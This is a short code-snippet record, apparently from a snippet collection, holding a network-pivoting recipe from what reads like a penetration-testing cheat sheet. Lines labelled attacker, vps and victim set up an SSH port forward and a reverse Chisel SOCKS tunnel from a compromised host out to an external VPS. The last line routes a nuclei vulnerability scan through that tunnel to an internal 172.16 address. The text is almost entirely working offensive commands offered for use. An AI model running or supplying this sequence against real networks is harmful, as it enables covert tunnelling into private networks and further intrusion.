---
id: ae4e4491-6d73-46fd-b32e-fb3e65bcbc94
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:22.549910+00:00'
updated_at: '2023-04-10T20:25:14.783211+00:00'
---

# Code Snippet ae4e4491

**Language**: ps1

```ps1
# https://github.com/hmgle/graftcp

# Create a SOCKS5, using Chisel or another tool and forward it through SSH
(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 

# Run graftcp and specify the SOCKS5
(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
(attacker) $ graftcp ./nuclei -u http://172.16.1.24
```


